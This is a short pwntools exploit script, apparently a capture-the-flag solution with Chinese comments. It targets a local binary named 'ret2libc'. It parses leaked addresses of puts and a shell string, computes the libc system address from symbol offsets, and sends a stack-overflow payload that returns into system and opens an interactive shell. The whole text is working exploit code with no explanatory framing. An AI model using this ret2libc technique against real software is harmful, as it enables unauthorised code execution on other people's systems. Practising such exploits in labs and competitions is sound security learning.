from pwn import *
from LibcSearcher import *

ret2libc = ELF('./ret2libc')

sh = process('./ret2libc')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

system_offset = libc.symbols['system']
puts_offset = libc.symbols['puts']

# 接收并处理字节串数据
sh.recvuntil(b'is ')
sh_addr = int(sh.recvuntil(b'\n', drop=True), 16)
print(hex(sh_addr))

sh.recvuntil(b'is ')
puts_addr = int(sh.recvuntil(b'\n', drop=True), 16)
print(hex(puts_addr))

# 计算 system 地址: puts_addr - puts_offset = 基地址，加上system的offset就可以得到system_addr
system_addr = puts_addr - puts_offset + system_offset

# 构造 payload
payload = flat([b'a' * 0x1c, b'bbbb', system_addr, b'bbbb', sh_addr])

#gdb.attach(sh)
sh.sendline(payload)
sh.interactive()